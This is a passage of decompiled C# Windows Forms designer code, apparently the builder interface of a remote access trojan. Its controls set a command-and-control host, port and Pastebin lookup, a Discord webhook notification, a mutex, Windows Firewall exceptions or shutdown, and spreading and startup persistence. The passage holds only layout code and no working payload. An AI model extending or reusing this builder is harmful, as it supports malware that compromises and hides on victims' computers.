		Guna2GradientPanel2.ShadowDecoration.Parent = Guna2GradientPanel2;
		Guna2GradientPanel2.Size = new Size(11, 524);
		Guna2GradientPanel2.TabIndex = 135;
		Guna2GradientPanel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left;
		Guna2GradientPanel1.Location = new Point(8, 42);
		Guna2GradientPanel1.Name = "Guna2GradientPanel1";
		Guna2GradientPanel1.ShadowDecoration.Parent = Guna2GradientPanel1;
		Guna2GradientPanel1.Size = new Size(10, 522);
		Guna2GradientPanel1.TabIndex = 38;
		TabControl2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		TabControl2.Controls.Add(Connect1);
		TabControl2.Controls.Add(Install1);
		TabControl2.Controls.Add(Security1);
		TabControl2.Controls.Add(TabPage6);
		TabControl2.Controls.Add(TabPage8);
		TabControl2.Controls.Add(TabPage9);
		TabControl2.Controls.Add(TabPage3);
		TabControl2.Location = new Point(8, 20);
		TabControl2.Name = "TabControl2";
		TabControl2.SelectedIndex = 0;
		TabControl2.Size = new Size(902, 547);
		TabControl2.TabIndex = 68;
		Connect1.BackColor = Color.FromArgb(46, 51, 73);
		Connect1.Controls.Add(CCC);
		Connect1.Location = new Point(4, 22);
		Connect1.Name = "Connect1";
		Connect1.Padding = new Padding(3);
		Connect1.Size = new Size(894, 521);
		Connect1.TabIndex = 0;
		Connect1.Text = "Connect";
		CCC.BackColor = Color.FromArgb(46, 51, 73);
		CCC.Controls.Add(Guna2GradientPanel5);
		CCC.Controls.Add(Guna2GradientPanel7);
		CCC.Dock = DockStyle.Fill;
		CCC.ForeColor = Color.Transparent;
		CCC.Location = new Point(3, 3);
		CCC.Name = "CCC";
		CCC.Size = new Size(888, 515);
		CCC.TabIndex = 64;
		Guna2GradientPanel5.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel5.Controls.Add(ListView_Socket);
		Guna2GradientPanel5.Controls.Add(PictureBox33);
		Guna2GradientPanel5.Controls.Add(Label22);
		Guna2GradientPanel5.Controls.Add(Pastebin);
		Guna2GradientPanel5.Controls.Add(IPDNS);
		Guna2GradientPanel5.Controls.Add(Add_Socket);
		Guna2GradientPanel5.Controls.Add(host);
		Guna2GradientPanel5.Controls.Add(Ports);
		Guna2GradientPanel5.Controls.Add(NameClient);
		Guna2GradientPanel5.Location = new Point(12, 24);
		Guna2GradientPanel5.Name = "Guna2GradientPanel5";
		Guna2GradientPanel5.ShadowDecoration.Parent = Guna2GradientPanel5;
		Guna2GradientPanel5.Size = new Size(424, 352);
		Guna2GradientPanel5.TabIndex = 41;
		ListView_Socket.BackColor = Color.FromArgb(37, 42, 64);
		ListView_Socket.BorderStyle = BorderStyle.None;
		ListView_Socket.Columns.AddRange(new ColumnHeader[3]
		{
			vmethod_83(),
			vmethod_85(),
			vmethod_87()
		});
		ListView_Socket.ContextMenuStrip = Remove_List_Connection;
		ListView_Socket.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		ListView_Socket.ForeColor = Color.LawnGreen;
		ListView_Socket.FullRowSelect = true;
		ListView_Socket.HideSelection = false;
		ListView_Socket.Location = new Point(10, 227);
		ListView_Socket.Name = "ListView_Socket";
		ListView_Socket.Size = new Size(399, 120);
		ListView_Socket.TabIndex = 115;
		ListView_Socket.UseCompatibleStateImageBehavior = false;
		ListView_Socket.View = View.Details;
		vmethod_83().Text = "Type";
		vmethod_83().Width = 92;
		vmethod_85().Text = "Host";
		vmethod_85().Width = 210;
		vmethod_87().Text = "Port";
		vmethod_87().Width = 97;
		Remove_List_Connection.BackColor = Color.Black;
		Remove_List_Connection.Font = new Font("Segoe UI", 14.25f, FontStyle.Bold);
		Remove_List_Connection.ImageScalingSize = new Size(32, 32);
		Remove_List_Connection.ImeMode = ImeMode.Disable;
		Remove_List_Connection.Items.AddRange(new ToolStripItem[2] { ToolStripMenuItem19, ToolStripMenuItem26 });
		Remove_List_Connection.LayoutStyle = ToolStripLayoutStyle.VerticalStackWithOverflow;
		Remove_List_Connection.Name = "ContextMenuStrip1";
		Remove_List_Connection.RenderMode = ToolStripRenderMode.Professional;
		Remove_List_Connection.Size = new Size(158, 80);
		ToolStripMenuItem19.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem19.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem19.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem19.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem19.Image");
		ToolStripMenuItem19.Name = "ToolStripMenuItem19";
		ToolStripMenuItem19.Size = new Size(157, 38);
		ToolStripMenuItem19.Text = "Remove";
		ToolStripMenuItem26.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem26.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem26.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem26.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem26.Image");
		ToolStripMenuItem26.Name = "ToolStripMenuItem26";
		ToolStripMenuItem26.Size = new Size(157, 38);
		ToolStripMenuItem26.Text = "Remove All";
		PictureBox33.Image = (Image)componentResourceManager.GetObject("PictureBox33.Image");
		PictureBox33.Location = new Point(373, 3);
		PictureBox33.Name = "PictureBox33";
		PictureBox33.Size = new Size(48, 30);
		PictureBox33.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox33.TabIndex = 114;
		PictureBox33.TabStop = false;
		Label22.AutoSize = true;
		Label22.Font = new Font("Nirmala UI", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label22.ForeColor = Color.FromArgb(224, 224, 224);
		Label22.Location = new Point(5, 5);
		Label22.Name = "Label22";
		Label22.Size = new Size(171, 21);
		Label22.TabIndex = 44;
		Label22.Text = "Add Connection Socket";
		Pastebin.AutoSize = true;
		Pastebin.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Pastebin.Location = new Point(94, 164);
		Pastebin.Name = "Pastebin";
		Pastebin.Size = new Size(167, 18);
		Pastebin.TabIndex = 43;
		Pastebin.Text = "Pastebin \\ Raw ( IP - Host )";
		Pastebin.UseVisualStyleBackColor = true;
		IPDNS.AutoSize = true;
		IPDNS.Checked = true;
		IPDNS.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		IPDNS.Location = new Point(10, 163);
		IPDNS.Name = "IPDNS";
		IPDNS.Size = new Size(66, 18);
		IPDNS.TabIndex = 42;
		IPDNS.TabStop = true;
		IPDNS.Text = "IP - DNS";
		IPDNS.UseVisualStyleBackColor = true;
		Add_Socket.CheckedState.Parent = Add_Socket;
		Add_Socket.CustomImages.Parent = Add_Socket;
		Add_Socket.Font = new Font("Segoe UI", 9f);
		Add_Socket.ForeColor = Color.White;
		Add_Socket.HoverState.Parent = Add_Socket;
		Add_Socket.Location = new Point(10, 189);
		Add_Socket.Name = "Add_Socket";
		Add_Socket.ShadowDecoration.Parent = Add_Socket;
		Add_Socket.Size = new Size(399, 30);
		Add_Socket.TabIndex = 41;
		Add_Socket.Text = "Add Socket";
		host.Animated = true;
		host.AutoRoundedCorners = true;
		host.BackColor = Color.FromArgb(24, 30, 54);
		host.BorderColor = Color.FromArgb(0, 126, 249);
		host.BorderRadius = 13;
		host.BorderStyle = DashStyle.Custom;
		host.Cursor = Cursors.IBeam;
		host.DefaultText = "";
		host.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		host.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		host.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		host.DisabledState.Parent = host;
		host.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		host.FillColor = Color.FromArgb(24, 30, 54);
		host.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		host.FocusedState.Parent = host;
		host.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		host.ForeColor = Color.White;
		host.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		host.HoverState.Parent = host;
		host.IconLeft = (Image)componentResourceManager.GetObject("host.IconLeft");
		host.Location = new Point(10, 84);
		host.Margin = new Padding(3, 2, 3, 2);
		host.Name = "host";
		host.PasswordChar = '\0';
		host.PlaceholderForeColor = Color.Gray;
		host.PlaceholderText = "IP / DNS";
		host.SelectedText = "";
		host.ShadowDecoration.Parent = host;
		host.Size = new Size(399, 29);
		host.Style = TextBoxStyle.Material;
		host.TabIndex = 32;
		host.TextAlign = HorizontalAlignment.Center;
		Ports.Animated = true;
		Ports.AutoRoundedCorners = true;
		Ports.BackColor = Color.FromArgb(24, 30, 54);
		Ports.BorderColor = Color.FromArgb(0, 126, 249);
		Ports.BorderRadius = 13;
		Ports.BorderStyle = DashStyle.Custom;
		Ports.Cursor = Cursors.IBeam;
		Ports.DefaultText = "";
		Ports.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Ports.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Ports.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Ports.DisabledState.Parent = Ports;
		Ports.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Ports.FillColor = Color.FromArgb(24, 30, 54);
		Ports.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Ports.FocusedState.Parent = Ports;
		Ports.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Ports.ForeColor = Color.White;
		Ports.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Ports.HoverState.Parent = Ports;
		Ports.IconLeft = (Image)componentResourceManager.GetObject("Ports.IconLeft");
		Ports.Location = new Point(10, 124);
		Ports.Margin = new Padding(3, 2, 3, 2);
		Ports.Name = "Ports";
		Ports.PasswordChar = '\0';
		Ports.PlaceholderForeColor = Color.Gray;
		Ports.PlaceholderText = "TCP Port";
		Ports.SelectedText = "";
		Ports.ShadowDecoration.Parent = Ports;
		Ports.Size = new Size(399, 29);
		Ports.Style = TextBoxStyle.Material;
		Ports.TabIndex = 35;
		Ports.TextAlign = HorizontalAlignment.Center;
		NameClient.Animated = true;
		NameClient.AutoRoundedCorners = true;
		NameClient.BackColor = Color.FromArgb(24, 30, 54);
		NameClient.BorderColor = Color.FromArgb(0, 126, 249);
		NameClient.BorderRadius = 13;
		NameClient.BorderStyle = DashStyle.Custom;
		NameClient.Cursor = Cursors.IBeam;
		NameClient.DefaultText = "";
		NameClient.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		NameClient.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		NameClient.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		NameClient.DisabledState.Parent = NameClient;
		NameClient.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		NameClient.FillColor = Color.FromArgb(24, 30, 54);
		NameClient.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		NameClient.FocusedState.Parent = NameClient;
		NameClient.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		NameClient.ForeColor = Color.White;
		NameClient.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		NameClient.HoverState.Parent = NameClient;
		NameClient.IconLeft = (Image)componentResourceManager.GetObject("NameClient.IconLeft");
		NameClient.Location = new Point(10, 45);
		NameClient.Margin = new Padding(3, 2, 3, 2);
		NameClient.Name = "NameClient";
		NameClient.PasswordChar = '\0';
		NameClient.PlaceholderForeColor = Color.Gray;
		NameClient.PlaceholderText = "Client name";
		NameClient.SelectedText = "";
		NameClient.ShadowDecoration.Parent = NameClient;
		NameClient.Size = new Size(399, 29);
		NameClient.Style = TextBoxStyle.Material;
		NameClient.TabIndex = 37;
		NameClient.TextAlign = HorizontalAlignment.Center;
		Guna2GradientPanel7.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel7.Controls.Add(PictureBox23);
		Guna2GradientPanel7.Controls.Add(Num_Delay);
		Guna2GradientPanel7.Controls.Add(Discord_URL);
		Guna2GradientPanel7.Controls.Add(PictureBox30);
		Guna2GradientPanel7.Controls.Add(Label45);
		Guna2GradientPanel7.Controls.Add(Discord);
		Guna2GradientPanel7.Controls.Add(PictureBox32);
		Guna2GradientPanel7.Controls.Add(Label47);
		Guna2GradientPanel7.Controls.Add(PictureBox34);
		Guna2GradientPanel7.Controls.Add(Delay);
		Guna2GradientPanel7.Controls.Add(Encrypt_ifo);
		Guna2GradientPanel7.Controls.Add(Label48);
		Guna2GradientPanel7.Controls.Add(PictureBox15);
		Guna2GradientPanel7.Controls.Add(Label46);
		Guna2GradientPanel7.Controls.Add(Rndm);
		Guna2GradientPanel7.Controls.Add(PictureBox35);
		Guna2GradientPanel7.Controls.Add(Label52);
		Guna2GradientPanel7.Controls.Add(Add_Firewall);
		Guna2GradientPanel7.Controls.Add(PictureBox37);
		Guna2GradientPanel7.Controls.Add(TurnOff_Firewall);
		Guna2GradientPanel7.Controls.Add(Label54);
		Guna2GradientPanel7.Location = new Point(443, 24);
		Guna2GradientPanel7.Name = "Guna2GradientPanel7";
		Guna2GradientPanel7.ShadowDecoration.Parent = Guna2GradientPanel7;
		Guna2GradientPanel7.Size = new Size(429, 351);
		Guna2GradientPanel7.TabIndex = 40;
		PictureBox23.Image = (Image)componentResourceManager.GetObject("PictureBox23.Image");
		PictureBox23.Location = new Point(383, 164);
		PictureBox23.Name = "PictureBox23";
		PictureBox23.Size = new Size(29, 23);
		PictureBox23.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox23.TabIndex = 143;
		PictureBox23.TabStop = false;
		Num_Delay.Animated = true;
		Num_Delay.AutoRoundedCorners = true;
		Num_Delay.BackColor = Color.FromArgb(24, 30, 54);
		Num_Delay.BorderColor = Color.FromArgb(0, 126, 249);
		Num_Delay.BorderRadius = 14;
		Num_Delay.BorderStyle = DashStyle.Custom;
		Num_Delay.Cursor = Cursors.IBeam;
		Num_Delay.DefaultText = "4";
		Num_Delay.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Num_Delay.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Num_Delay.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Num_Delay.DisabledState.Parent = Num_Delay;
		Num_Delay.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Num_Delay.Enabled = false;
		Num_Delay.FillColor = Color.FromArgb(24, 30, 54);
		Num_Delay.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Num_Delay.FocusedState.Parent = Num_Delay;
		Num_Delay.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Num_Delay.ForeColor = Color.White;
		Num_Delay.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Num_Delay.HoverState.Parent = Num_Delay;
		Num_Delay.Location = new Point(337, 112);
		Num_Delay.Margin = new Padding(3, 2, 3, 2);
		Num_Delay.Name = "Num_Delay";
		Num_Delay.PasswordChar = '\0';
		Num_Delay.PlaceholderForeColor = Color.Gray;
		Num_Delay.PlaceholderText = "4";
		Num_Delay.SelectedText = "";
		Num_Delay.SelectionStart = 1;
		Num_Delay.ShadowDecoration.Parent = Num_Delay;
		Num_Delay.Size = new Size(75, 30);
		Num_Delay.Style = TextBoxStyle.Material;
		Num_Delay.TabIndex = 142;
		Num_Delay.TextAlign = HorizontalAlignment.Center;
		Discord_URL.Animated = true;
		Discord_URL.AutoRoundedCorners = true;
		Discord_URL.BackColor = Color.FromArgb(24, 30, 54);
		Discord_URL.BorderColor = Color.FromArgb(0, 126, 249);
		Discord_URL.BorderRadius = 13;
		Discord_URL.BorderStyle = DashStyle.Custom;
		Discord_URL.Cursor = Cursors.IBeam;
		Discord_URL.DefaultText = "";
		Discord_URL.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Discord_URL.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Discord_URL.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Discord_URL.DisabledState.Parent = Discord_URL;
		Discord_URL.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Discord_URL.Enabled = false;
		Discord_URL.FillColor = Color.FromArgb(24, 30, 54);
		Discord_URL.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Discord_URL.FocusedState.Parent = Discord_URL;
		Discord_URL.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Discord_URL.ForeColor = Color.White;
		Discord_URL.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Discord_URL.HoverState.Parent = Discord_URL;
		Discord_URL.IconLeft = (Image)componentResourceManager.GetObject("Discord_URL.IconLeft");
		Discord_URL.Location = new Point(15, 266);
		Discord_URL.Margin = new Padding(3, 2, 3, 2);
		Discord_URL.Name = "Discord_URL";
		Discord_URL.PasswordChar = '\0';
		Discord_URL.PlaceholderForeColor = Color.Gray;
		Discord_URL.PlaceholderText = "Server (URL)";
		Discord_URL.SelectedText = "";
		Discord_URL.ShadowDecoration.Parent = Discord_URL;
		Discord_URL.Size = new Size(404, 29);
		Discord_URL.Style = TextBoxStyle.Material;
		Discord_URL.TabIndex = 141;
		Discord_URL.TextAlign = HorizontalAlignment.Center;
		PictureBox30.Image = (Image)componentResourceManager.GetObject("PictureBox30.Image");
		PictureBox30.Location = new Point(15, 227);
		PictureBox30.Name = "PictureBox30";
		PictureBox30.Size = new Size(48, 30);
		PictureBox30.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox30.TabIndex = 140;
		PictureBox30.TabStop = false;
		Label45.AutoSize = true;
		Label45.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label45.ForeColor = Color.White;
		Label45.Location = new Point(112, 234);
		Label45.Name = "Label45";
		Label45.Size = new Size(243, 14);
		Label45.TabIndex = 139;
		Label45.Text = "Send me a notification to Discord Webhook";
		Discord.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Discord.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Discord.CheckedState.InnerBorderColor = Color.White;
		Discord.CheckedState.InnerColor = Color.White;
		Discord.CheckedState.Parent = Discord;
		Discord.Location = new Point(71, 232);
		Discord.Name = "Discord";
		Discord.ShadowDecoration.Parent = Discord;
		Discord.Size = new Size(35, 20);
		Discord.TabIndex = 138;
		Discord.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Discord.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Discord.UncheckedState.InnerBorderColor = Color.White;
		Discord.UncheckedState.InnerColor = Color.White;
		Discord.UncheckedState.Parent = Discord;
		PictureBox32.Image = (Image)componentResourceManager.GetObject("PictureBox32.Image");
		PictureBox32.Location = new Point(15, 124);
		PictureBox32.Name = "PictureBox32";
		PictureBox32.Size = new Size(48, 30);
		PictureBox32.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox32.TabIndex = 137;
		PictureBox32.TabStop = false;
		Label47.AutoSize = true;
		Label47.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label47.ForeColor = Color.White;
		Label47.Location = new Point(111, 131);
		Label47.Name = "Label47";
		Label47.Size = new Size(170, 14);
		Label47.TabIndex = 136;
		Label47.Text = "Connection Delay  ( Seconds )";
		PictureBox34.Image = (Image)componentResourceManager.GetObject("PictureBox34.Image");
		PictureBox34.Location = new Point(15, 44);
		PictureBox34.Name = "PictureBox34";
		PictureBox34.Size = new Size(48, 30);
		PictureBox34.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox34.TabIndex = 134;
		PictureBox34.TabStop = false;
		Delay.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Delay.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Delay.CheckedState.InnerBorderColor = Color.White;
		Delay.CheckedState.InnerColor = Color.White;
		Delay.CheckedState.Parent = Delay;
		Delay.Location = new Point(70, 130);
		Delay.Name = "Delay";
		Delay.ShadowDecoration.Parent = Delay;
		Delay.Size = new Size(35, 20);
		Delay.TabIndex = 135;
		Delay.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Delay.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Delay.UncheckedState.InnerBorderColor = Color.White;
		Delay.UncheckedState.InnerColor = Color.White;
		Delay.UncheckedState.Parent = Delay;
		Encrypt_ifo.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Encrypt_ifo.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Encrypt_ifo.CheckedState.InnerBorderColor = Color.White;
		Encrypt_ifo.CheckedState.InnerColor = Color.White;
		Encrypt_ifo.CheckedState.Parent = Encrypt_ifo;
		Encrypt_ifo.Location = new Point(71, 50);
		Encrypt_ifo.Name = "Encrypt_ifo";
		Encrypt_ifo.ShadowDecoration.Parent = Encrypt_ifo;
		Encrypt_ifo.Size = new Size(35, 20);
		Encrypt_ifo.TabIndex = 132;
		Encrypt_ifo.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Encrypt_ifo.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Encrypt_ifo.UncheckedState.InnerBorderColor = Color.White;
		Encrypt_ifo.UncheckedState.InnerColor = Color.White;
		Encrypt_ifo.UncheckedState.Parent = Encrypt_ifo;
		Label48.AutoSize = true;
		Label48.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label48.ForeColor = Color.White;
		Label48.Location = new Point(112, 51);
		Label48.Name = "Label48";
		Label48.Size = new Size(72, 14);
		Label48.TabIndex = 133;
		Label48.Text = "Encrypt info";
		PictureBox15.Image = (Image)componentResourceManager.GetObject("PictureBox15.Image");
		PictureBox15.Location = new Point(378, 5);
		PictureBox15.Name = "PictureBox15";
		PictureBox15.Size = new Size(48, 30);
		PictureBox15.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox15.TabIndex = 131;
		PictureBox15.TabStop = false;
		Label46.AutoSize = true;
		Label46.Font = new Font("Nirmala UI", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label46.ForeColor = Color.FromArgb(224, 224, 224);
		Label46.Location = new Point(3, 3);
		Label46.Name = "Label46";
		Label46.Size = new Size(149, 21);
		Label46.TabIndex = 130;
		Label46.Text = "Connection Settings";
		Rndm.Animated = true;
		Rndm.AutoRoundedCorners = true;
		Rndm.BackColor = Color.FromArgb(24, 30, 54);
		Rndm.BorderColor = Color.FromArgb(0, 126, 249);
		Rndm.BorderRadius = 11;
		Rndm.BorderStyle = DashStyle.Custom;
		Rndm.Cursor = Cursors.IBeam;
		Rndm.DefaultText = "";
		Rndm.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Rndm.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Rndm.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Rndm.DisabledState.Parent = Rndm;
		Rndm.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Rndm.FillColor = Color.FromArgb(24, 30, 54);
		Rndm.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Rndm.FocusedState.Parent = Rndm;
		Rndm.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Rndm.ForeColor = Color.White;
		Rndm.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Rndm.HoverState.Parent = Rndm;
		Rndm.IconLeft = (Image)componentResourceManager.GetObject("Rndm.IconLeft");
		Rndm.IconLeftCursor = Cursors.Hand;
		Rndm.Location = new Point(15, 316);
		Rndm.Margin = new Padding(3, 2, 3, 2);
		Rndm.Name = "Rndm";
		Rndm.PasswordChar = '\0';
		Rndm.PlaceholderForeColor = Color.Gray;
		Rndm.PlaceholderText = "Mutex";
		Rndm.ReadOnly = true;
		Rndm.SelectedText = "";
		Rndm.ShadowDecoration.Parent = Rndm;
		Rndm.Size = new Size(404, 24);
		Rndm.Style = TextBoxStyle.Material;
		Rndm.TabIndex = 42;
		Rndm.TextAlign = HorizontalAlignment.Center;
		PictureBox35.Image = (Image)componentResourceManager.GetObject("PictureBox35.Image");
		PictureBox35.Location = new Point(15, 83);
		PictureBox35.Name = "PictureBox35";
		PictureBox35.Size = new Size(48, 30);
		PictureBox35.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox35.TabIndex = 119;
		PictureBox35.TabStop = false;
		Label52.AutoSize = true;
		Label52.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label52.ForeColor = Color.White;
		Label52.Location = new Point(112, 90);
		Label52.Name = "Label52";
		Label52.Size = new Size(199, 14);
		Label52.TabIndex = 118;
		Label52.Text = "Add exception in Windows Firewall";
		Add_Firewall.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Add_Firewall.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Add_Firewall.CheckedState.InnerBorderColor = Color.White;
		Add_Firewall.CheckedState.InnerColor = Color.White;
		Add_Firewall.CheckedState.Parent = Add_Firewall;
		Add_Firewall.Location = new Point(71, 89);
		Add_Firewall.Name = "Add_Firewall";
		Add_Firewall.ShadowDecoration.Parent = Add_Firewall;
		Add_Firewall.Size = new Size(35, 20);
		Add_Firewall.TabIndex = 117;
		Add_Firewall.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Add_Firewall.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Add_Firewall.UncheckedState.InnerBorderColor = Color.White;
		Add_Firewall.UncheckedState.InnerColor = Color.White;
		Add_Firewall.UncheckedState.Parent = Add_Firewall;
		PictureBox37.Image = (Image)componentResourceManager.GetObject("PictureBox37.Image");
		PictureBox37.Location = new Point(15, 164);
		PictureBox37.Name = "PictureBox37";
		PictureBox37.Size = new Size(48, 30);
		PictureBox37.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox37.TabIndex = 113;
		PictureBox37.TabStop = false;
		TurnOff_Firewall.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		TurnOff_Firewall.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		TurnOff_Firewall.CheckedState.InnerBorderColor = Color.White;
		TurnOff_Firewall.CheckedState.InnerColor = Color.White;
		TurnOff_Firewall.CheckedState.Parent = TurnOff_Firewall;
		TurnOff_Firewall.Location = new Point(71, 170);
		TurnOff_Firewall.Name = "TurnOff_Firewall";
		TurnOff_Firewall.ShadowDecoration.Parent = TurnOff_Firewall;
		TurnOff_Firewall.Size = new Size(35, 20);
		TurnOff_Firewall.TabIndex = 111;
		TurnOff_Firewall.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		TurnOff_Firewall.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		TurnOff_Firewall.UncheckedState.InnerBorderColor = Color.White;
		TurnOff_Firewall.UncheckedState.InnerColor = Color.White;
		TurnOff_Firewall.UncheckedState.Parent = TurnOff_Firewall;
		Label54.AutoSize = true;
		Label54.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label54.ForeColor = Color.White;
		Label54.Location = new Point(112, 170);
		Label54.Name = "Label54";
		Label54.Size = new Size(207, 14);
		Label54.TabIndex = 112;
		Label54.Text = "Turn off  Windows Defender Firewall";
		Install1.BackColor = Color.FromArgb(46, 51, 73);
		Install1.Controls.Add(Panel13);
		Install1.Location = new Point(4, 22);
		Install1.Name = "Install1";
		Install1.Padding = new Padding(3);
		Install1.Size = new Size(894, 398);
		Install1.TabIndex = 1;
		Install1.Text = "Install";
		Panel13.BackColor = Color.FromArgb(46, 51, 73);
		Panel13.Controls.Add(Panel11);
		Panel13.Controls.Add(Guna2GradientPanel9);
		Panel13.Controls.Add(Guna2GradientPanel6);
		Panel13.Dock = DockStyle.Fill;
		Panel13.ForeColor = Color.Transparent;
		Panel13.Location = new Point(3, 3);
		Panel13.Name = "Panel13";
		Panel13.Size = new Size(888, 392);
		Panel13.TabIndex = 65;
		Panel11.BackColor = Color.FromArgb(24, 30, 54);
		Panel11.Controls.Add(PictureBox51);
		Panel11.Controls.Add(Protect_Spreading);
		Panel11.Controls.Add(Label73);
		Panel11.Controls.Add(PictureBox50);
		Panel11.Controls.Add(Protect_Startup);
		Panel11.Controls.Add(Label72);
		Panel11.Controls.Add(PictureBox49);
		Panel11.Controls.Add(Protect_Install);
		Panel11.Controls.Add(Label71);
		Panel11.Location = new Point(8, 325);
		Panel11.Name = "Panel11";
		Panel11.Size = new Size(870, 50);
		Panel11.TabIndex = 108;
		PictureBox51.Image = (Image)componentResourceManager.GetObject("PictureBox51.Image");
		PictureBox51.Location = new Point(589, 9);
		PictureBox51.Name = "PictureBox51";
		PictureBox51.Size = new Size(48, 30);
		PictureBox51.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox51.TabIndex = 195;
		PictureBox51.TabStop = false;
		Protect_Spreading.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Protect_Spreading.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Protect_Spreading.CheckedState.InnerBorderColor = Color.White;
		Protect_Spreading.CheckedState.InnerColor = Color.White;
		Protect_Spreading.CheckedState.Parent = Protect_Spreading;
		Protect_Spreading.Enabled = false;
		Protect_Spreading.Location = new Point(645, 15);
		Protect_Spreading.Name = "Protect_Spreading";
		Protect_Spreading.ShadowDecoration.Parent = Protect_Spreading;
		Protect_Spreading.Size = new Size(35, 20);
		Protect_Spreading.TabIndex = 194;
		Protect_Spreading.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Protect_Spreading.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Protect_Spreading.UncheckedState.InnerBorderColor = Color.White;
		Protect_Spreading.UncheckedState.InnerColor = Color.White;
		Protect_Spreading.UncheckedState.Parent = Protect_Spreading;
		Label73.AutoSize = true;
		Label73.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label73.ForeColor = Color.White;
		Label73.Location = new Point(686, 16);
